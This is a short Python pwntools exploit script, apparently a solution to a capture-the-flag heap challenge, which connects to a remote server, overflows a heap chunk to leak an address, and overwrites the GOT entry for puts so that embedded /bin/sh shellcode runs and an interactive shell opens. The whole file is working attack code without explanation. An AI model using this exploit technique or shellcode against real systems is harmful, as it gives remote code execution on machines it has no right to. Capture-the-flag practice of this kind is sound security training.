from pwn import *
from time import sleep
import re

GOT_PUTS = 0x804B014
SHELLCODE = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

#r = process("./aa508d1df74d46a88bc02210c7f92824")
r = remote("133.130.90.210", 6666)

#add two girls with size 100
l = log.progress("Adding two girls")
r.recvuntil("Your Choice:")
r.send("1\n0\n")
r.recvuntil("Your Choice:")
r.send("1\n0\n")
print r.recvuntil("Your Choice:")
l.success()

#leak heap address
l = log.progress("Leaking heap address")
r.send("3\n0\n1\n")
r.recvuntil("Give your Girl:\n")
r.send('A'*124)
sleep(1)
r.recvuntil("Your Choice:")
r.send("4\n0\n")
buf = r.recvuntil("Your Choice:")
addr = u32(re.search("AA(.{4})\nLet's", buf).group(1)) + 12
l.success(hex(addr))

#fix heap structure
r.send("3\n0\n1\n")
r.recvuntil("Give your Girl:\n")
payload = "\xeb\x0e"			#jump $+0x10
payload += "a"*(0x10 - len(payload))
payload += SHELLCODE
payload += "9"*(116 - len(payload)) + p32(addr) + p32(GOT_PUTS - 4)
r.send(payload)
sleep(1)
r.recvuntil("Your Choice:")

r.send("2\n1\n")
r.interactive()
